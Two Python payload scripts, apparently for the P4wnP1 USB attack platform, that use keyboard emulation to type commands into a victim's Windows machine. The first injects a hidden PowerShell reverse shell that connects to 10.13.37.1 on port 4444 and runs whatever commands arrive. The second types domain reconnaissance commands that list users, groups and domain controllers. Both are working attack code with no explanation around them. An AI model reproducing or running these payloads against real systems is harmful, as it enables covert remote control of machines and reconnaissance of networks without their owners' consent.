# File: /opt/p4wnp1/payloads/hid/reverse_shell_inject.py
from tools import hid_type

print("[*] Injecting reverse shell payload into HID interface")
payload = (
    "powershell -w hidden -nop -c \"$client = New-Object Net.Sockets.TCPClient('10.13.37.1',4444);"
    "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};"
    "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){"
    "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
    "$sendback = (iex $data 2>&1 | Out-String );"
    "$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';"
    "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
    "$stream.Write($sendbyte,0,$sendbyte.Length)}\""
)
hid_type.type_string(payload)


# File: /opt/p4wnp1/payloads/hid/domain_enum_hid.py
from tools import hid_type

print("[*] Injecting PowerShell domain enumeration commands")
cmds = [
    "whoami /all",
    "net user",
    "net group /domain",
    "nltest /dclist:"
]

for cmd in cmds:
    hid_type.type_string(cmd)
